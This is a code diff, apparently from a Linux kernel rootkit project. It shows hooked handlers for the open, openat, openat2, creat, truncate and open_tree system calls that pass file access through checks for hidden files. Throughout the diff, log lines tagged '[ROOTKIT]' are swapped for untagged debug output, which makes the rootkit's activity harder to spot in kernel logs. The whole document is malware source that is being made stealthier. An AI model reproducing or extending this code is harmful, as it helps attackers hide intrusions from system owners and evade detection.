@@ -34,7 +34,7 @@ static inline long do_open(const sysfun_t orig_func, struct pt_regs *const p_reg
 SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, int, i32_flags,
                       umode_t, ui16_mode)
 {
-    pr_info("[ROOTKIT] open(%p, %s%#x, %#ho)\n", s_filename, SIGNED_ARG(i32_flags), ui16_mode);
+    pr_dev_info("open(%p, %s%#x, %#ho)\n", s_filename, SIGNED_ARG(i32_flags), ui16_mode);
 
     return do_open(orig_open, p_regs, AT_FDCWD, s_filename, i32_flags);
 }
@@ -43,8 +43,8 @@ SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, 
 SYSCALL_HOOK_HANDLER4(openat, orig_openat, p_regs, int, i32_dfd, const char __user *, s_filename,
                       int, i32_flags, umode_t, ui16_mode)
 {
-    pr_info("[ROOTKIT] openat(%d, %p, %s%#x, %#ho)\n", i32_dfd, s_filename, SIGNED_ARG(i32_flags),
-            ui16_mode);
+    pr_dev_info("openat(%d, %p, %s%#x, %#ho)\n", i32_dfd, s_filename, SIGNED_ARG(i32_flags),
+                ui16_mode);
 
     return do_open(orig_openat, p_regs, i32_dfd, s_filename, i32_flags);
 }
@@ -56,7 +56,7 @@ SYSCALL_HOOK_HANDLER4(openat2, orig_openat2, p_regs, int, i32_dfd, const char __
     int err;
     struct open_how tmp_how;
 
-    pr_info("[ROOTKIT] openat2(%d, %p, %p, %zu)\n", i32_dfd, s_filename, p_how, sz_usize);
+    pr_dev_info("openat2(%d, %p, %p, %zu)\n", i32_dfd, s_filename, p_how, sz_usize);
 
     // Following code is based on fs/open.c:sys_openat2()
 
@@ -76,7 +76,7 @@ SYSCALL_HOOK_HANDLER4(openat2, orig_openat2, p_regs, int, i32_dfd, const char __
 SYSCALL_HOOK_HANDLER2(creat, orig_creat, p_regs, const char __user *, s_filename, umode_t,
                       ui16_mode)
 {
-    pr_info("[ROOTKIT] creat(%p, %#ho)\n", s_filename, ui16_mode);
+    pr_dev_info("creat(%p, %#ho)\n", s_filename, ui16_mode);
 
     return do_open(orig_creat, p_regs, AT_FDCWD, s_filename, O_CREAT | O_WRONLY | O_TRUNC);
 }
@@ -85,7 +85,7 @@ SYSCALL_HOOK_HANDLER2(creat, orig_creat, p_regs, const char __user *, s_filename
 SYSCALL_HOOK_HANDLER2(truncate, orig_truncate, p_regs, const char __user *, s_filename, long,
                       i64_length)
 {
-    pr_info("[ROOTKIT] truncate(%p, %ld)\n", s_filename, i64_length);
+    pr_dev_info("truncate(%p, %ld)\n", s_filename, i64_length);
 
     return do_check_hidden(orig_truncate, p_regs, AT_FDCWD, s_filename, 0);
 }
@@ -94,7 +94,7 @@ SYSCALL_HOOK_HANDLER2(truncate, orig_truncate, p_regs, const char __user *, s_fi
 SYSCALL_HOOK_HANDLER3(open_tree, orig_open_tree, p_regs, int, i32_dfd, const char __user *,
                       s_filename, unsigned int, ui32_flags)
 {
-    pr_info("[ROOTKIT] open_tree(%d, %p, %#x)\n", i32_dfd, s_filename, ui32_flags);
+    pr_dev_info("open_tree(%d, %p, %#x)\n", i32_dfd, s_filename, ui32_flags);
 
     // Following code is based on fs/namespace.c:2471
     if (ui32_flags & ~(AT_EMPTY_PATH | AT_NO_AUTOMOUNT | AT_RECURSIVE | AT_SYMLINK_NOFOLLOW |
